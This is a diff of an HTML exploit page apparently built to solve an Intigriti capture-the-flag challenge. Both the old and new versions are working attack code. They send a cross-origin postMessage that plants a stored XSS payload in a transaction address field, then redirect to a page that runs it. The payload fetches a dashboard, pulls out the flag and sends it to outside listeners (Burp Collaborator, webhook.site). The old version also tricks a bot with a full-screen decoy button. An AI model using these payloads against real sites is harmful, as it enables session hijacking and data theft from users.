@@ -1,76 +1,46 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Claim Prize</title>
-    <style>
-        /* Make the button fill the screen so the bot definitely clicks it */
-        body, html { margin: 0; padding: 0; height: 100%; }
-        button {
-            width: 100%;
-            height: 100%;
-            font-size: 3em;
-            background: #00FF88;
-            border: none;
-            cursor: pointer;
-            font-weight: bold;
-        }
-    </style>
+    <title>Intigriti Exploit</title>
 </head>
 <body>
-    <button onclick="startExploit()">CLICK TO VERIFY</button>
+    <iframe 
+        id="frame" 
+        name="fetch('/dashboard.html').then(r=>r.text()).then(d=>{ navigator.sendBeacon('https://webhook.site/5c699d9b-1a2c-4d4c-a79a-d3f7b3fac905?flag='+encodeURIComponent(d.match(/INTIGRITI\{.*?\}/)[0])) })"
+        src="https://challenge-0126.intigriti.io/checkout.html" 
+        style="opacity:0;width:0;height:0">
+    </iframe>
 
     <script>
-        // CONFIGURATION
-        const BASE_URL = 'https://challenge-0126.intigriti.io';
-        // YOUR BURP COLLABORATOR
-        const LISTENER = 'https://01zjpgwjjsk0ysqf60d67fa1nstjhe53.oastify.com';
+        const TARGET = "https://challenge-0126.intigriti.io";
+        const frame = document.getElementById('frame');
 
-        function startExploit() {
-            // 1. Open Checkout in a new tab (This sends Cookies!)
-            // We use a reference 'win' to talk to it
-            const win = window.open(BASE_URL + '/checkout.html?currency=1337COIN&price=1', '_blank');
+        // This tiny payload breaks out of the title="" attribute in marketwatch.html
+        // and executes the code we stored in the iframe's name attribute above.
+        const tiny_xss = `"><svg/onload=eval(name)>`;
 
-            // 2. Wait for the window to load
+        // Wait for the target checkout page to load in the iframe
+        frame.onload = () => {
             setTimeout(() => {
-                
-                // --- THE PAYLOAD ---
-                // 1. Fetch dashboard.html (where the flag is)
-                // 2. Extract the flag using Regex
-                // 3. Exfiltrate to your listener
-                const jsCode = `
-                    fetch('/dashboard.html')
-                    .then(r => r.text())
-                    .then(html => {
-                        const match = html.match(/INTIGRITI\\{.*?\\}/);
-                        const flag = match ? match[0] : 'FLAG_NOT_FOUND';
-                        window.location = '${LISTENER}/?flag=' + btoa(flag);
-                    })
-                `;
-
-                // Clean the code for injection
-                const flatCode = jsCode.replace(/\n/g, ' ');
-                // Break out of title="" attribute
-                const xss = `"><img src=x onerror="${flatCode}">`;
-
-                // 3. Send the POST Message
-                // Since 'win' was opened by us, we can send messages to it!
-                win.postMessage({
+                // STEP 1: CSRF via postMessage (Triggering the vulnerability in checkout.html)
+                // We assume the admin has funds in 1337COIN or BTC.
+                frame.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
-                        currency: '1337COIN', // Admin has this currency
-                        amount: 1337, 
-                        toAddress: xss
+                        toAddress: tiny_xss, 
+                        currency: 'BTC', // Using BTC is usually safer/more standard
+                        amount: 0.00000001
                     }
                 }, '*');
 
-                // 4. Redirect the popup to MarketWatch to trigger the XSS
+                // STEP 2: Trigger the XSS (Targeting marketwatch.html)
+                // We redirect the iframe to the page that displays the transactions.
+                // Because we redirect the iframe (not the top window), 'window.name' persists!
                 setTimeout(() => {
-                    win.location = BASE_URL + '/marketwatch.html';
-                }, 1500);
-
-            }, 2000);
-        }
+                    frame.contentWindow.location = TARGET + '/marketwatch.html';
+                }, 2000); // Give the API time to save the transaction
+            }, 1000);
+        };
     </script>
 </body>
 </html>
